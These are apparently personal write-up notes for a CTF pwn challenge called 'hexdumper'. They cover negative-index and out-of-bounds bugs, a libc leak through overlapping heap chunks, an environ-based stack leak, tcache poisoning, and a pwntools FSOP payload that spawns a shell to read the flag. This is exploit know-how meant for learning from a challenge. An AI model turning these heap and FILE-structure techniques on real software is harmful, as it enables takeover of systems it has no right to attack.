
# debug
## ask_for_index  可以输入负数， 在change_byte的时候，只要dumps[idx]值不为空，可以造成任意偏移地址写
改写got表？NO。

## got表无法修改
![](https://r2.20161023.xyz/pic/20250613150037474.png)

## Duff's device
代码中提到，外部地址 https://en.wikipedia.org/wiki/Duff%27s_device，这肯定有用， 不然肯定不会写

```
    register unsigned char *to = dumps[idx1]+len1, *from = dumps[idx2];
    register int count = len2;
    {
        register int n = (count + 7) / 8;
        switch (count % 8) {
        case 0: do { *to++ = *from++;
        case 7:      *to++ = *from++;
        case 6:      *to++ = *from++;
        case 5:      *to++ = *from++;
        case 4:      *to++ = *from++;
        case 3:      *to++ = *from++;
        case 2:      *to++ = *from++;
        case 1:      *to++ = *from++;
                } while (--n > 0);
        }
    }
```

此代码中，如果count=len2=0的话，但是导致to指向内容的8个字节被追加到from最后，那怎么让len2=0呢，
题目中提供了resize方法，使'size_t len2 = dump_sizes[idx2];'中len2=0

## 栈上任意地址读
只要把offset设置的很大很大，idx就可以随便设置，没有限制，能泄漏出所有类型的地址
```
    size_t len = dump_sizes[idx];

    printf("\tOffset: ");
    size_t offset = 0;
    scanf("%lu", &offset);
    if (offset >= len) {
        // 程序上任意地址读?offset = 0xffff-ffff-fffff-ffff
        // 指向栈？堆？libc，那泄漏简单了
        printf("\tOffset is bigger than dump size. %lu >= %lu\n", offset, len);
        return;
    }
```

## _IO_2_1_stdin_
![](https://r2.20161023.xyz/pic/20250619164739368.png)


## 泄漏libc
- 0x21-->0x421, 复写chunksize， 制造堆重叠
- 然后free，进unsortbin，fd保留main_arena指针，
- 再申请第一chunk，让覆盖区域内的原chunk（p1）和新chunk重叠
- show p1，就泄漏libc

## environ
```
pwndbg> x/10gx 0x218d78 +  0x7f87558d4000
0x7f8755aecd78 <environ>:       0x00007ffed97c08c8      0x0000000000000000
0x7f8755aecd88 <tiocgsid_does_not_work.0>:      0x0000000000000000      0x000055d92348d000
0x7f8755aecd98: 0x0000000000000000      0x0000000000000000
0x7f8755aecda8: 0x0000000000000000      0x0000000000000000
0x7f8755aecdb8 <ecvt_buffer+8>: 0x0000000000000000      0x0000000000000000
```

```
00:0000│ rsp 0x7ffed97c0780 ◂— 0x100000000
01:0008│-008 0x7ffed97c0788 ◂— 0x958220b31b7ac00
02:0010│ rbp 0x7ffed97c0790 —▸ 0x7ffed97c0830 —▸ 0x7ffed97c0890 ◂— 0
03:0018│+008 0x7ffed97c0798 —▸ 0x7f87558fe3b8 (__libc_start_call_main+120) ◂— mov edi, eax
04:0020│+010 0x7ffed97c07a0 —▸ 0x7ffed97c07e0 —▸ 0x55d921f9fd70 —▸ 0x55d921f9d180 ◂— endbr64
05:0028│+018 0x7ffed97c07a8 —▸ 0x7ffed97c08b8 —▸ 0x7ffed97c1584 ◂— './hexdumper'
06:0030│+020 0x7ffed97c07b0 ◂— 0x121f9c040
07:0038│+028 0x7ffed97c07b8 —▸ 0x55d921f9dde5 ◂— push rbp

```
environ到ret的偏移量为0x130, 可以算出ret的栈地址
```
environ - ret = 0x130
0x00007ffed97c08c8 - 0x7ffed97c0798
```


# FSOP

Finally, we do the poisoning to get an almost arbitrary write on libc. To get code execution with it this is a good resource , though it is somewhat outdated. From experience I can say that the libc’s GOT table is now FULL RELRO and dtor_list is no longer close to PTR_MANGLE cookie. Though FSOP still works like a charm and nothing suggests that anything will change. I use a payload I’ve seen only ptr-yudai use in their’s write-ups, but it’s the best one I’ve seen.

```
# Poison tcache pointer to point to the stderr FILE struct.
change_bytes(io, c, 0x20, p64(((libc.sym['_IO_2_1_stderr_']) ^ (xor_key))))
x = create_dump(io, 0xf0-8)
# Malloc returned a pointer inside of libc, with which we will do FSOP.
target = create_dump(io, 0xf0-8)

# Payload I have stolen from ptr-yudai.
file = FileStructure(0)
file.flags = u64(p32(0xfbad0101) + b";sh\0")
file._IO_save_end = libc.sym["system"]
file._lock = libc.sym["_IO_2_1_stderr_"] - 0x10
file._wide_data = libc.sym["_IO_2_1_stderr_"] - 0x10
file._offset = 0
file._old_offset = 0
file.unknown2 = b"\x00"*24+ p32(1) + p32(0) + p64(0) + \
    p64(libc.sym["_IO_2_1_stderr_"] - 0x10) + \
    p64(libc.sym["_IO_wfile_jumps"] + 0x18 - 0x58)
change_bytes(io, target, 0, bytes(file))

io.sendline(b"cat flag")
io.sendline(b"cat flag")

io.intearactive()
```

[参考链接](https://poniponiponiponiponiponiponiponiponi.github.io/ctf/pwn/c/rust/risc-v/2025/05/16/Challenges-I-Wrote-For-BtS-CTF-2025.html)